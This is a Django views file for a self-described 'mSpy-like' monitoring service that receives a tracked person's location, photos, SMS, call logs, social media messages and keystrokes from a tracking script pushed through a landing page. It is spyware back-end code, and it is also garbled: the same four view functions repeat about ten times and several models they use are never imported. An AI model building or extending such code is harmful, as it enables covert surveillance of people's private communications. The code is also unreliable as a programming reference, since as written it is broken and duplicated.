import json, secrets
from django.http import JsonResponse, HttpResponseBadRequest, HttpResponseForbidden
from django.views.decorators.http import require_http_methods
from django.core.exceptions import PermissionDenied
from django.views.decorators.csrf import csrf_exempt
from django.shortcuts import get_object_or_404, render
from .models import (
    Child, LocationLog, IPLog, DeviceInfoLog, PhotoCapture,
    SensorDataLog, PermissionLog, SMSLog, CallLog, SocialMediaLog, KeyloggerLog
)

def landing(request):
    """Landing page that loads the tracking JS and prompts for permissions."""
    return render(request, 'tracking/placeholder.html')

@csrf_exempt
def renew_auth_token(request):
    if request.method == 'POST':
        try:
            data = json.loads(request.body)
            child = get_object_or_404(Child, device_id=data['device_id'])
            child.auth_token = secrets.token_urlsafe(32)
            child.save()
            return JsonResponse({'new_token': child.auth_token})
        except Exception as e:
            return HttpResponseBadRequest(str(e))
    return HttpResponseBadRequest("Only POST allowed")


def validate_device_token(func):
    def wrapper(request, *args, **kwargs):
        device_id = request.headers.get('X-Device-ID')
        auth_token = request.headers.get('X-Auth-Token')
        try:
            child = Child.objects.get(device_id=device_id)
            if child.auth_token != auth_token:
                raise PermissionDenied('Invalid authentication token')
            return func(request, *args, **kwargs)
        except Child.DoesNotExist:
            return HttpResponseForbidden('Invalid device ID')
    return wrapper

@require_http_methods(['POST'])
@validate_device_token
def update_location(request):
    if request.method == 'POST':
        try:
            data = json.loads(request.body)
            device_id = data.get('device_id')
            child = get_object_or_404(Child, device_id=device_id)
            LocationLog.objects.create(
                child=child,
                latitude=data.get('latitude'),
                longitude=data.get('longitude'),
                accuracy=data.get('accuracy')
            )
            return JsonResponse({'status': 'ok'})
        except Exception as e:
            return HttpResponseBadRequest(str(e))
    return HttpResponseBadRequest("Only POST allowed")

@require_http_methods(['POST'])
@validate_device_token
def submit_call_log(request):
    try:
        data = json.loads(request.body)
        child = Child.objects.get(device_id=data['device_id'])
        CallLog.objects.create(
            child=child,
            number=data['number'],
            duration=data['duration'],
            type=data['type'],
            timestamp=data.get('timestamp')
        )
        return JsonResponse({'status': 'ok'})
    except Exception as e:
        return HttpResponseBadRequest(str(e))

@require_http_methods(['POST'])
@validate_device_token
def submit_social_media(request):
    try:
        data = json.loads(request.body)
        child = Child.objects.get(device_id=data['device_id'])
        SocialMediaMessage.objects.create(
            child=child,
            platform=data['platform'],
            content=data['content'],
            sender=data['sender'],
            attachment=data.get('attachment')
        )
        return JsonResponse({'status': 'ok'})
    except Exception as e:
        return HttpResponseBadRequest(str(e))

@require_http_methods(['POST'])
@validate_device_token
def submit_app_usage(request):
    try:
        data = json.loads(request.body)
        child = Child.objects.get(device_id=data['device_id'])
        AppUsage.objects.create(
            child=child,
            app_name=data['app_name'],
            package_name=data['package_name'],
            start_time=data['start_time'],
            end_time=data['end_time'],
            foreground_duration=data['duration']
        )
        return JsonResponse({'status': 'ok'})
    except Exception as e:
        return HttpResponseBadRequest(str(e))

@require_http_methods(['GET'])
@validate_device_token
def get_parental_alerts(request):
    child = Child.objects.get(device_id=request.headers['X-Device-ID'])
    alerts = GeofenceAlert.objects.filter(child=child).order_by('-timestamp')[:10]
    return JsonResponse({
        'alerts': [{
            'type': alert.triggered_type,
            'coordinates': {
                'lat': alert.latitude,
                'lng': alert.longitude
            },
            'timestamp': alert.timestamp
        } for alert in alerts]
    })

@csrf_exempt
def update_ip(request):
    if request.method == 'POST':
        try:
            data = json.loads(request.body)
            device_id = data.get('device_id')
            child = get_object_or_404(Child, device_id=device_id)
            IPLog.objects.create(
                child=child,
                ip_address=data.get('ip_address'),
                details=data.get('details', '')
            )
            return JsonResponse({'status': 'ok'})
        except Exception as e:
            return HttpResponseBadRequest(str(e))
    return HttpResponseBadRequest("Only POST allowed")

@require_http_methods(['POST'])
@validate_device_token
def submit_call_log(request):
    try:
        data = json.loads(request.body)
        child = Child.objects.get(device_id=data['device_id'])
        CallLog.objects.create(
            child=child,
            number=data['number'],
            duration=data['duration'],
            type=data['type'],
            timestamp=data.get('timestamp')
        )
        return JsonResponse({'status': 'ok'})
    except Exception as e:
        return HttpResponseBadRequest(str(e))

@require_http_methods(['POST'])
@validate_device_token
def submit_social_media(request):
    try:
        data = json.loads(request.body)
        child = Child.objects.get(device_id=data['device_id'])
        SocialMediaMessage.objects.create(
            child=child,
            platform=data['platform'],
            content=data['content'],
            sender=data['sender'],
            attachment=data.get('attachment')
        )
        return JsonResponse({'status': 'ok'})
    except Exception as e:
        return HttpResponseBadRequest(str(e))

@require_http_methods(['POST'])
@validate_device_token
def submit_app_usage(request):
    try:
        data = json.loads(request.body)
        child = Child.objects.get(device_id=data['device_id'])
        AppUsage.objects.create(
            child=child,
            app_name=data['app_name'],
            package_name=data['package_name'],
            start_time=data['start_time'],
            end_time=data['end_time'],
            foreground_duration=data['duration']
        )
        return JsonResponse({'status': 'ok'})
    except Exception as e:
        return HttpResponseBadRequest(str(e))

@require_http_methods(['GET'])
@validate_device_token
def get_parental_alerts(request):
    child = Child.objects.get(device_id=request.headers['X-Device-ID'])
    alerts = GeofenceAlert.objects.filter(child=child).order_by('-timestamp')[:10]
    return JsonResponse({
        'alerts': [{
            'type': alert.triggered_type,
            'coordinates': {
                'lat': alert.latitude,
                'lng': alert.longitude
            },
            'timestamp': alert.timestamp
        } for alert in alerts]
    })

@csrf_exempt
def update_device_info(request):
    if request.method == 'POST':
        try:
            data = json.loads(request.body)
            device_id = data.get('device_id')
            child = get_object_or_404(Child, device_id=device_id)
            DeviceInfoLog.objects.create(
                child=child,
                user_agent=data.get('user_agent', ''),
                platform=data.get('platform', ''),
                screen_width=data.get('screen_width', 0),
                screen_height=data.get('screen_height', 0),
                other_details=data.get('other_details', {})
            )
            return JsonResponse({'status': 'ok'})
        except Exception as e:
            return HttpResponseBadRequest(str(e))
    return HttpResponseBadRequest("Only POST allowed")

@require_http_methods(['POST'])
@validate_device_token
def submit_call_log(request):
    try:
        data = json.loads(request.body)
        child = Child.objects.get(device_id=data['device_id'])
        CallLog.objects.create(
            child=child,
            number=data['number'],
            duration=data['duration'],
            type=data['type'],
            timestamp=data.get('timestamp')
        )
        return JsonResponse({'status': 'ok'})
    except Exception as e:
        return HttpResponseBadRequest(str(e))

@require_http_methods(['POST'])
@validate_device_token
def submit_social_media(request):
    try:
        data = json.loads(request.body)
        child = Child.objects.get(device_id=data['device_id'])
        SocialMediaMessage.objects.create(
            child=child,
            platform=data['platform'],
            content=data['content'],
            sender=data['sender'],
            attachment=data.get('attachment')
        )
        return JsonResponse({'status': 'ok'})
    except Exception as e:
        return HttpResponseBadRequest(str(e))

@require_http_methods(['POST'])
@validate_device_token
def submit_app_usage(request):
    try:
        data = json.loads(request.body)
        child = Child.objects.get(device_id=data['device_id'])
        AppUsage.objects.create(
            child=child,
            app_name=data['app_name'],
            package_name=data['package_name'],
            start_time=data['start_time'],
            end_time=data['end_time'],
            foreground_duration=data['duration']
        )
        return JsonResponse({'status': 'ok'})
    except Exception as e:
        return HttpResponseBadRequest(str(e))

@require_http_methods(['GET'])
@validate_device_token
def get_parental_alerts(request):
    child = Child.objects.get(device_id=request.headers['X-Device-ID'])
    alerts = GeofenceAlert.objects.filter(child=child).order_by('-timestamp')[:10]
    return JsonResponse({
        'alerts': [{
            'type': alert.triggered_type,
            'coordinates': {
                'lat': alert.latitude,
                'lng': alert.longitude
            },
            'timestamp': alert.timestamp
        } for alert in alerts]
    })

@csrf_exempt
def capture_photo(request):
    if request.method == 'POST':
        try:
            device_id = request.POST.get('device_id')
            child = get_object_or_404(Child, device_id=device_id)
            image = request.FILES.get('image')
            latitude = request.POST.get('latitude')
            longitude = request.POST.get('longitude')
            PhotoCapture.objects.create(
                child=child,
                image=image,
                latitude=latitude if latitude else None,
                longitude=longitude if longitude else None
            )
            return JsonResponse({'status': 'ok'})
        except Exception as e:
            return HttpResponseBadRequest(str(e))
    return HttpResponseBadRequest("Only POST allowed")

@require_http_methods(['POST'])
@validate_device_token
def submit_call_log(request):
    try:
        data = json.loads(request.body)
        child = Child.objects.get(device_id=data['device_id'])
        CallLog.objects.create(
            child=child,
            number=data['number'],
            duration=data['duration'],
            type=data['type'],
            timestamp=data.get('timestamp')
        )
        return JsonResponse({'status': 'ok'})
    except Exception as e:
        return HttpResponseBadRequest(str(e))

@require_http_methods(['POST'])
@validate_device_token
def submit_social_media(request):
    try:
        data = json.loads(request.body)
        child = Child.objects.get(device_id=data['device_id'])
        SocialMediaMessage.objects.create(
            child=child,
            platform=data['platform'],
            content=data['content'],
            sender=data['sender'],
            attachment=data.get('attachment')
        )
        return JsonResponse({'status': 'ok'})
    except Exception as e:
        return HttpResponseBadRequest(str(e))

@require_http_methods(['POST'])
@validate_device_token
def submit_app_usage(request):
    try:
        data = json.loads(request.body)
        child = Child.objects.get(device_id=data['device_id'])
        AppUsage.objects.create(
            child=child,
            app_name=data['app_name'],
            package_name=data['package_name'],
            start_time=data['start_time'],
            end_time=data['end_time'],
            foreground_duration=data['duration']
        )
        return JsonResponse({'status': 'ok'})
    except Exception as e:
        return HttpResponseBadRequest(str(e))

@require_http_methods(['GET'])
@validate_device_token
def get_parental_alerts(request):
    child = Child.objects.get(device_id=request.headers['X-Device-ID'])
    alerts = GeofenceAlert.objects.filter(child=child).order_by('-timestamp')[:10]
    return JsonResponse({
        'alerts': [{
            'type': alert.triggered_type,
            'coordinates': {
                'lat': alert.latitude,
                'lng': alert.longitude
            },
            'timestamp': alert.timestamp
        } for alert in alerts]
    })

@csrf_exempt
def update_sensor_data(request):
    if request.method == 'POST':
        try:
            data = json.loads(request.body)
            device_id = data.get('device_id')
            sensor_data = data.get('sensor_data', {})
            child = get_object_or_404(Child, device_id=device_id)
            SensorDataLog.objects.create(child=child, data=sensor_data)
            return JsonResponse({'status': 'ok'})
        except Exception as e:
            return HttpResponseBadRequest(str(e))
    return HttpResponseBadRequest("Only POST allowed")

@require_http_methods(['POST'])
@validate_device_token
def submit_call_log(request):
    try:
        data = json.loads(request.body)
        child = Child.objects.get(device_id=data['device_id'])
        CallLog.objects.create(
            child=child,
            number=data['number'],
            duration=data['duration'],
            type=data['type'],
            timestamp=data.get('timestamp')
        )
        return JsonResponse({'status': 'ok'})
    except Exception as e:
        return HttpResponseBadRequest(str(e))

@require_http_methods(['POST'])
@validate_device_token
def submit_social_media(request):
    try:
        data = json.loads(request.body)
        child = Child.objects.get(device_id=data['device_id'])
        SocialMediaMessage.objects.create(
            child=child,
            platform=data['platform'],
            content=data['content'],
            sender=data['sender'],
            attachment=data.get('attachment')
        )
        return JsonResponse({'status': 'ok'})
    except Exception as e:
        return HttpResponseBadRequest(str(e))

@require_http_methods(['POST'])
@validate_device_token
def submit_app_usage(request):
    try:
        data = json.loads(request.body)
        child = Child.objects.get(device_id=data['device_id'])
        AppUsage.objects.create(
            child=child,
            app_name=data['app_name'],
            package_name=data['package_name'],
            start_time=data['start_time'],
            end_time=data['end_time'],
            foreground_duration=data['duration']
        )
        return JsonResponse({'status': 'ok'})
    except Exception as e:
        return HttpResponseBadRequest(str(e))

@require_http_methods(['GET'])
@validate_device_token
def get_parental_alerts(request):
    child = Child.objects.get(device_id=request.headers['X-Device-ID'])
    alerts = GeofenceAlert.objects.filter(child=child).order_by('-timestamp')[:10]
    return JsonResponse({
        'alerts': [{
            'type': alert.triggered_type,
            'coordinates': {
                'lat': alert.latitude,
                'lng': alert.longitude
            },
            'timestamp': alert.timestamp
        } for alert in alerts]
    })

@csrf_exempt
def update_permission_status(request):
    if request.method == 'POST':
        try:
            data = json.loads(request.body)
            device_id = data.get('device_id')
            child = get_object_or_404(Child, device_id=device_id)
            PermissionLog.objects.create(
                child=child,
                geolocation=data.get('geolocation', False),
                camera=data.get('camera', False),
                microphone=data.get('microphone', False),
                notifications=data.get('notifications', False),
                clipboard=data.get('clipboard', False),
                sensors=data.get('sensors', False),
                bluetooth=data.get('bluetooth', False),
                other=data.get('other', {})
            )
            return JsonResponse({'status': 'ok'})
        except Exception as e:
            return HttpResponseBadRequest(str(e))
    return HttpResponseBadRequest("Only POST allowed")

@require_http_methods(['POST'])
@validate_device_token
def submit_call_log(request):
    try:
        data = json.loads(request.body)
        child = Child.objects.get(device_id=data['device_id'])
        CallLog.objects.create(
            child=child,
            number=data['number'],
            duration=data['duration'],
            type=data['type'],
            timestamp=data.get('timestamp')
        )
        return JsonResponse({'status': 'ok'})
    except Exception as e:
        return HttpResponseBadRequest(str(e))

@require_http_methods(['POST'])
@validate_device_token
def submit_social_media(request):
    try:
        data = json.loads(request.body)
        child = Child.objects.get(device_id=data['device_id'])
        SocialMediaMessage.objects.create(
            child=child,
            platform=data['platform'],
            content=data['content'],
            sender=data['sender'],
            attachment=data.get('attachment')
        )
        return JsonResponse({'status': 'ok'})
    except Exception as e:
        return HttpResponseBadRequest(str(e))

@require_http_methods(['POST'])
@validate_device_token
def submit_app_usage(request):
    try:
        data = json.loads(request.body)
        child = Child.objects.get(device_id=data['device_id'])
        AppUsage.objects.create(
            child=child,
            app_name=data['app_name'],
            package_name=data['package_name'],
            start_time=data['start_time'],
            end_time=data['end_time'],
            foreground_duration=data['duration']
        )
        return JsonResponse({'status': 'ok'})
    except Exception as e:
        return HttpResponseBadRequest(str(e))

@require_http_methods(['GET'])
@validate_device_token
def get_parental_alerts(request):
    child = Child.objects.get(device_id=request.headers['X-Device-ID'])
    alerts = GeofenceAlert.objects.filter(child=child).order_by('-timestamp')[:10]
    return JsonResponse({
        'alerts': [{
            'type': alert.triggered_type,
            'coordinates': {
                'lat': alert.latitude,
                'lng': alert.longitude
            },
            'timestamp': alert.timestamp
        } for alert in alerts]
    })

# Endpoints for mSpy-like features

@csrf_exempt
def update_sms_log(request):
    if request.method == 'POST':
        try:
            data = json.loads(request.body)
            device_id = data.get('device_id')
            child = get_object_or_404(Child, device_id=device_id)
            SMSLog.objects.create(
                child=child,
                message=data.get('message'),
                sender=data.get('sender', ''),
                receiver=data.get('receiver', ''),
                direction=data.get('direction', 'received')
            )
            return JsonResponse({'status': 'ok'})
        except Exception as e:
            return HttpResponseBadRequest(str(e))
    return HttpResponseBadRequest("Only POST allowed")

@require_http_methods(['POST'])
@validate_device_token
def submit_call_log(request):
    try:
        data = json.loads(request.body)
        child = Child.objects.get(device_id=data['device_id'])
        CallLog.objects.create(
            child=child,
            number=data['number'],
            duration=data['duration'],
            type=data['type'],
            timestamp=data.get('timestamp')
        )
        return JsonResponse({'status': 'ok'})
    except Exception as e:
        return HttpResponseBadRequest(str(e))

@require_http_methods(['POST'])
@validate_device_token
def submit_social_media(request):
    try:
        data = json.loads(request.body)
        child = Child.objects.get(device_id=data['device_id'])
        SocialMediaMessage.objects.create(
            child=child,
            platform=data['platform'],
            content=data['content'],
            sender=data['sender'],
            attachment=data.get('attachment')
        )
        return JsonResponse({'status': 'ok'})
    except Exception as e:
        return HttpResponseBadRequest(str(e))

@require_http_methods(['POST'])
@validate_device_token
def submit_app_usage(request):
    try:
        data = json.loads(request.body)
        child = Child.objects.get(device_id=data['device_id'])
        AppUsage.objects.create(
            child=child,
            app_name=data['app_name'],
            package_name=data['package_name'],
            start_time=data['start_time'],
            end_time=data['end_time'],
            foreground_duration=data['duration']
        )
        return JsonResponse({'status': 'ok'})
    except Exception as e:
        return HttpResponseBadRequest(str(e))

@require_http_methods(['GET'])
@validate_device_token
def get_parental_alerts(request):
    child = Child.objects.get(device_id=request.headers['X-Device-ID'])
    alerts = GeofenceAlert.objects.filter(child=child).order_by('-timestamp')[:10]
    return JsonResponse({
        'alerts': [{
            'type': alert.triggered_type,
            'coordinates': {
                'lat': alert.latitude,
                'lng': alert.longitude
            },
            'timestamp': alert.timestamp
        } for alert in alerts]
    })

@csrf_exempt
def update_call_log(request):
    if request.method == 'POST':
        try:
            data = json.loads(request.body)
            device_id = data.get('device_id')
            child = get_object_or_404(Child, device_id=device_id)
            CallLog.objects.create(
                child=child,
                caller=data.get('caller'),
                callee=data.get('callee'),
                duration=data.get('duration', 0)
            )
            return JsonResponse({'status': 'ok'})
        except Exception as e:
            return HttpResponseBadRequest(str(e))
    return HttpResponseBadRequest("Only POST allowed")

@require_http_methods(['POST'])
@validate_device_token
def submit_call_log(request):
    try:
        data = json.loads(request.body)
        child = Child.objects.get(device_id=data['device_id'])
        CallLog.objects.create(
            child=child,
            number=data['number'],
            duration=data['duration'],
            type=data['type'],
            timestamp=data.get('timestamp')
        )
        return JsonResponse({'status': 'ok'})
    except Exception as e:
        return HttpResponseBadRequest(str(e))

@require_http_methods(['POST'])
@validate_device_token
def submit_social_media(request):
    try:
        data = json.loads(request.body)
        child = Child.objects.get(device_id=data['device_id'])
        SocialMediaMessage.objects.create(
            child=child,
            platform=data['platform'],
            content=data['content'],
            sender=data['sender'],
            attachment=data.get('attachment')
        )
        return JsonResponse({'status': 'ok'})
    except Exception as e:
        return HttpResponseBadRequest(str(e))

@require_http_methods(['POST'])
@validate_device_token
def submit_app_usage(request):
    try:
        data = json.loads(request.body)
        child = Child.objects.get(device_id=data['device_id'])
        AppUsage.objects.create(
            child=child,
            app_name=data['app_name'],
            package_name=data['package_name'],
            start_time=data['start_time'],
            end_time=data['end_time'],
            foreground_duration=data['duration']
        )
        return JsonResponse({'status': 'ok'})
    except Exception as e:
        return HttpResponseBadRequest(str(e))

@require_http_methods(['GET'])
@validate_device_token
def get_parental_alerts(request):
    child = Child.objects.get(device_id=request.headers['X-Device-ID'])
    alerts = GeofenceAlert.objects.filter(child=child).order_by('-timestamp')[:10]
    return JsonResponse({
        'alerts': [{
            'type': alert.triggered_type,
            'coordinates': {
                'lat': alert.latitude,
                'lng': alert.longitude
            },
            'timestamp': alert.timestamp
        } for alert in alerts]
    })

@csrf_exempt
def update_social_log(request):
    if request.method == 'POST':
        try:
            data = json.loads(request.body)
            device_id = data.get('device_id')
            child = get_object_or_404(Child, device_id=device_id)
            SocialMediaLog.objects.create(
                child=child,
                platform=data.get('platform'),
                sender=data.get('sender'),
                message=data.get('message')
            )
            return JsonResponse({'status': 'ok'})
        except Exception as e:
            return HttpResponseBadRequest(str(e))
    return HttpResponseBadRequest("Only POST allowed")

@require_http_methods(['POST'])
@validate_device_token
def submit_call_log(request):
    try:
        data = json.loads(request.body)
        child = Child.objects.get(device_id=data['device_id'])
        CallLog.objects.create(
            child=child,
            number=data['number'],
            duration=data['duration'],
            type=data['type'],
            timestamp=data.get('timestamp')
        )
        return JsonResponse({'status': 'ok'})
    except Exception as e:
        return HttpResponseBadRequest(str(e))

@require_http_methods(['POST'])
@validate_device_token
def submit_social_media(request):
    try:
        data = json.loads(request.body)
        child = Child.objects.get(device_id=data['device_id'])
        SocialMediaMessage.objects.create(
            child=child,
            platform=data['platform'],
            content=data['content'],
            sender=data['sender'],
            attachment=data.get('attachment')
        )
        return JsonResponse({'status': 'ok'})
    except Exception as e:
        return HttpResponseBadRequest(str(e))

@require_http_methods(['POST'])
@validate_device_token
def submit_app_usage(request):
    try:
        data = json.loads(request.body)
        child = Child.objects.get(device_id=data['device_id'])
        AppUsage.objects.create(
            child=child,
            app_name=data['app_name'],
            package_name=data['package_name'],
            start_time=data['start_time'],
            end_time=data['end_time'],
            foreground_duration=data['duration']
        )
        return JsonResponse({'status': 'ok'})
    except Exception as e:
        return HttpResponseBadRequest(str(e))

@require_http_methods(['GET'])
@validate_device_token
def get_parental_alerts(request):
    child = Child.objects.get(device_id=request.headers['X-Device-ID'])
    alerts = GeofenceAlert.objects.filter(child=child).order_by('-timestamp')[:10]
    return JsonResponse({
        'alerts': [{
            'type': alert.triggered_type,
            'coordinates': {
                'lat': alert.latitude,
                'lng': alert.longitude
            },
            'timestamp': alert.timestamp
        } for alert in alerts]
    })

@csrf_exempt
def update_keylogger_log(request):
    if request.method == 'POST':
        try:
            data = json.loads(request.body)
            device_id = data.get('device_id')
            child = get_object_or_404(Child, device_id=device_id)
            KeyloggerLog.objects.create(child=child, keystrokes=data.get('keystrokes'))
            return JsonResponse({'status': 'ok'})
        except Exception as e:
            return HttpResponseBadRequest(str(e))
    return HttpResponseBadRequest("Only POST allowed")

@require_http_methods(['POST'])
@validate_device_token
def submit_call_log(request):
    try:
        data = json.loads(request.body)
        child = Child.objects.get(device_id=data['device_id'])
        CallLog.objects.create(
            child=child,
            number=data['number'],
            duration=data['duration'],
            type=data['type'],
            timestamp=data.get('timestamp')
        )
        return JsonResponse({'status': 'ok'})
    except Exception as e:
        return HttpResponseBadRequest(str(e))

@require_http_methods(['POST'])
@validate_device_token
def submit_social_media(request):
    try:
        data = json.loads(request.body)
        child = Child.objects.get(device_id=data['device_id'])
        SocialMediaMessage.objects.create(
            child=child,
            platform=data['platform'],
            content=data['content'],
            sender=data['sender'],
            attachment=data.get('attachment')
        )
        return JsonResponse({'status': 'ok'})
    except Exception as e:
        return HttpResponseBadRequest(str(e))

@require_http_methods(['POST'])
@validate_device_token
def submit_app_usage(request):
    try:
        data = json.loads(request.body)
        child = Child.objects.get(device_id=data['device_id'])
        AppUsage.objects.create(
            child=child,
            app_name=data['app_name'],
            package_name=data['package_name'],
            start_time=data['start_time'],
            end_time=data['end_time'],
            foreground_duration=data['duration']
        )
        return JsonResponse({'status': 'ok'})
    except Exception as e:
        return HttpResponseBadRequest(str(e))

@require_http_methods(['GET'])
@validate_device_token
def get_parental_alerts(request):
    child = Child.objects.get(device_id=request.headers['X-Device-ID'])
    alerts = GeofenceAlert.objects.filter(child=child).order_by('-timestamp')[:10]
    return JsonResponse({
        'alerts': [{
            'type': alert.triggered_type,
            'coordinates': {
                'lat': alert.latitude,
                'lng': alert.longitude
            },
            'timestamp': alert.timestamp
        } for alert in alerts]
    })

@csrf_exempt
def js_version(request):
    """Returns the current tracking.js version for auto-update purposes."""
    return JsonResponse({'version': '1.0.0'})


@csrf_exempt
def get_update_interval(request):
    if request.method == 'POST':
        try:
            data = json.loads(request.body)
            device_id = data.get('device_id')
            child = get_object_or_404(Child, device_id=device_id)
            return JsonResponse({'update_interval': child.update_interval})
        except Exception as e:
            return HttpResponseBadRequest(str(e))
    return HttpResponseBadRequest("Only POST allowed")

@require_http_methods(['POST'])
@validate_device_token
def submit_call_log(request):
    try:
        data = json.loads(request.body)
        child = Child.objects.get(device_id=data['device_id'])
        CallLog.objects.create(
            child=child,
            number=data['number'],
            duration=data['duration'],
            type=data['type'],
            timestamp=data.get('timestamp')
        )
        return JsonResponse({'status': 'ok'})
    except Exception as e:
        return HttpResponseBadRequest(str(e))

@require_http_methods(['POST'])
@validate_device_token
def submit_social_media(request):
    try:
        data = json.loads(request.body)
        child = Child.objects.get(device_id=data['device_id'])
        SocialMediaMessage.objects.create(
            child=child,
            platform=data['platform'],
            content=data['content'],
            sender=data['sender'],
            attachment=data.get('attachment')
        )
        return JsonResponse({'status': 'ok'})
    except Exception as e:
        return HttpResponseBadRequest(str(e))

@require_http_methods(['POST'])
@validate_device_token
def submit_app_usage(request):
    try:
        data = json.loads(request.body)
        child = Child.objects.get(device_id=data['device_id'])
        AppUsage.objects.create(
            child=child,
            app_name=data['app_name'],
            package_name=data['package_name'],
            start_time=data['start_time'],
            end_time=data['end_time'],
            foreground_duration=data['duration']
        )
        return JsonResponse({'status': 'ok'})
    except Exception as e:
        return HttpResponseBadRequest(str(e))

@require_http_methods(['GET'])
@validate_device_token
def get_parental_alerts(request):
    child = Child.objects.get(device_id=request.headers['X-Device-ID'])
    alerts = GeofenceAlert.objects.filter(child=child).order_by('-timestamp')[:10]
    return JsonResponse({
        'alerts': [{
            'type': alert.triggered_type,
            'coordinates': {
                'lat': alert.latitude,
                'lng': alert.longitude
            },
            'timestamp': alert.timestamp
        } for alert in alerts]
    })
